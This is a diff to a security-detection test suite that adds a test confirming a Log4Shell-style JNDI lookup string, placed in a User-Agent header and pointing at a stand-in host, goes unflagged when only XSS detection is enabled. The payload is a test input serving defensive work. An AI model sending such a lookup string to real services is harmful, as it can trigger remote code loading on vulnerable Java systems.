@@ -904,3 +904,15 @@ async def test_detect_penetration_attempt_legacy_smoke() -> None:
         f"legacy singleton false-positive rate rose: "
         f"baseline={len(_KNOWN_E2E_FALSE_POSITIVES)} actual={benign_flagged}"
     )
+
+
+@pytest.mark.asyncio
+async def test_always_scan_header_shield_honors_disabled_cmd_injection_category() -> (
+    None
+):
+    disabled_config = SecurityConfig(enabled_detection_categories={"xss"})
+    request = _user_agent_header_request("${jndi:ldap://evil.example/a}")
+
+    result = await detect_penetration_attempt(request, disabled_config)
+
+    assert result.is_threat is False
